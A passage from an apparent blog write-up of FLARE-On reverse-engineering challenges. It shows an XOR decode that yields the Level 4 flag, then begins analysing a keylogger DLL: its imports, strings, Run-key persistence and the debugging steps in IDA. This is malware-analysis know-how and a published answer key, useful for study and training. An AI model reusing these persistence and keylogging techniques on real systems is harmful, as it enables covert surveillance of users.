#93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x0035&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143868&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.$.t.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143870&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.k.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.u.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143878&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.k.6.6.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143880&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #268BD2&#34;&gt;..u.t.2.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143888&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;05&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.#.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143890&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.7.&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;.k.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;00143898&lt;/span&gt;  &lt;span style=&#34;color: #93A1A1&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.k.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;001438&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A0&lt;/span&gt;  &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;                 &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Python&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;friendly&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;format&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;352474252&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s apply the xor-logic on this string too.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Second string xor&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# add xor function from last example&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# last 13 bytes&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)[&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:]&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;@flare-on.com&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(ciphertext,plaintext)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(ciphertext,plaintext)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# result :)&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# EEFBEEFBEEFBE&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# 45454642454546424545464245&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Bingo. The key is &lt;code&gt;BEEF&lt;/code&gt;. It is also in the initial shellcode as a string. Let&amp;rsquo;s xor it with the complete string and get the flag.&lt;/p&gt;

&lt;h4 id=&#34;level-4-flag-wa1ch-d3m-spl01ts-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 4 flag: wa1ch.d3m.spl01ts@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch5-a-challenge-5-5get-about-it:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch5&#34;&gt;&lt;/a&gt; Challenge 5 - 5get About It&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Another one bites the dust!
Here&amp;#39;s some more fun for you, password is the same as always.
-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&#34;be-sure-to-run-this-challenge-in-a-vm:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Be sure to run this challenge in a VM.&lt;/h3&gt;

&lt;p&gt;The file inside the challenge zip is named &lt;code&gt;5get_it&lt;/code&gt; and is around 100KBs. A quick look with &lt;code&gt;HxD&lt;/code&gt; says it&amp;rsquo;s a Portable Executable (MZ and PE magic bytes). Let&amp;rsquo;s get some help from &lt;code&gt;PE-Studio&lt;/code&gt;. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on &lt;code&gt;Imported Symbols&lt;/code&gt; and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select &lt;code&gt;Query MSDN&lt;/code&gt; inside PE-Studio (handy, neh?).&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Interesting symbols&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;RegSetValueExA&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;RegCreateKeyA&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Messing&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;registry&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;CreateFileW&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;CreateFileA&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;WriteFile&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;CopyFileA&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Creating&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;writing&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;to&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;copying&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;file&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;GetAsyncKeyState:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Determines&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;whether&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;up&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;down&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;called&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;whether&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;was&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;pressed&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;after&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;previous&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;GetAsyncKeyState&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Also, let&amp;rsquo;s run &lt;code&gt;strings&lt;/code&gt; on it. I used &lt;a href=&#34;https://www.cygwin.com/&#34; target=&#34;_blank&#34;&gt;cygwin&lt;/a&gt;. I have omitted the garbage and only kept the interesting strings:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Interesting strings&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;strings.exe&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;get_it&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;svchost.log&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;SHIFT&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;RETURN&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BACKSPACE&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;TAB&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CTRL&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DELETE&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CAPS&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;LOCK&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;SOFTWARE&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Microsoft&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CurrentVersion&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Run&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;svchost&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;c:\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;system32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;svchost.dll&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;c:\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;system32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;rundll32.exe&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;system32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;svchost.dll&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;While doing the challenge only the first and last two lines were interesting to me.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It references &lt;code&gt;c:\windows\system32\svchost.dll&lt;/code&gt; and &lt;code&gt;svchost.log&lt;/code&gt; but there is no such file (Windows has &lt;code&gt;svchost.exe&lt;/code&gt; in that location).&lt;/li&gt;
&lt;li&gt;There is also &lt;code&gt;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&lt;/code&gt; which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in &lt;code&gt;DllMain&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s drop this into &lt;code&gt;IDA&lt;/code&gt; and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also &lt;a href=&#34;#ch7&#34;&gt;challenge 7&lt;/a&gt;). Put a breakpoint at the start of this function (&lt;code&gt;F2&lt;/code&gt; key).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-1.jpg&#34; alt=&#34;DLL Entry Point&#34; title=&#34;DLL Entry Point&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If we attempt to execute the tile. IDA will complain. It&amp;rsquo;s a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select &lt;code&gt;Local Win32 Debugger&lt;/code&gt; then go to &lt;code&gt;Debugger&lt;/code&gt; menu and select &lt;code&gt;Process Options&lt;/code&gt;. In the &lt;code&gt;Application&lt;/code&gt; textbox enter &lt;code&gt;c:\windows\system32\rundll32.exe&lt;/code&gt;. In &lt;code&gt;Parameters&lt;/code&gt; enter the path to the DLL. Don&amp;rsquo;t forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. &lt;code&gt;&amp;quot;c:\Flare Challenges\Ch5\5get_it.dll&amp;quot;,0&lt;/code&gt;). It didn&amp;rsquo;t work without the dll extension for me.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s start debugging. We observe standard stuff until we reach &lt;code&gt;.text:1000A6BB call    sub_1000A570&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-2.jpg&#34; alt=&#34;sub 1000A570&#34; title=&#34;sub 1000A570&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Inside the function we encounter &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;RegOpenKeyEx&lt;/a&gt; that opens a registry key. Full registry key is a combination of &lt;code&gt;hKey&lt;/code&gt; and &lt;code&gt;lpSubKey&lt;/code&gt;. &lt;code&gt;hKey&lt;/code&gt; can be one of the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;predefined keys&lt;/a&gt;. The constants for the predefined keys needed a bit of googling because the MSDN page didn&amp;rsquo;t list them. Here they are:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;.
| Key                 | Constant |
|---------------------|----------|
| HKEY_CLASSES_ROOT   |    0     |
| HKEY_CURRENT_USER   |    1     |
| HKEY_LOCAL_MACHINE  |    2     |
| HKEY_USERS          |    3     |
| HKEY_CURRENT_CONFIG |    5     |
.
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The binary is pushing &lt;code&gt;0x02&lt;/code&gt; for &lt;code&gt;hKey&lt;/code&gt; and &lt;code&gt;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&lt;/code&gt; for &lt;code&gt;lpSubKey&lt;/code&gt; which will result in the full path &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;. If function succeeds it will return &lt;code&gt;ERROR_SUCCESS&lt;/code&gt; which is 0 according to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;this page&lt;/a&gt;, otherwise it will return another error code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-3.jpg&#34; alt=&#34;Registry Key&#34; title=&#34;Registry Key&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).&lt;br /&gt;
